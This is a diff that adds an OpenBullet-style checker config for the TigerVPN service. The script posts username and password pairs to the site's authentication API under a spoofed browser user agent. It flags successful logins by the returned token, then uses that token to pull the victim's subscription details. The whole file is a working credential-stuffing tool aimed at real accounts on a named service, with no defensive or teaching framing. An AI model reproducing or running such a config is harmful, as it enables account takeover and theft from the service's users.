@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "TigerVPN",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-07T18:33:03.1327993+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tigervpn.com/api/authenticate" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.tigervpn.com" 
+  HEADER "If-Modified-Since: 0" 
+  HEADER "Origin: https://www.tigervpn.com" 
+  HEADER "Referer: https://www.tigervpn.com/login" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TOKEN" 
+
+REQUEST GET "https://www.tigervpn.com/app/components/auth/dashboard/views/AccountView.html" 
+  
+  HEADER "Host: www.tigervpn.com" 
+  HEADER "If-Modified-Since: 0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.tigervpn.com/dashboard" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Accept: text/html" 
+
+PARSE "<SOURCE>" LR "subscriptionInfo.billing_cycle_days >= 1825\">" "</div></div></" -> CAP "Subscription" 
+
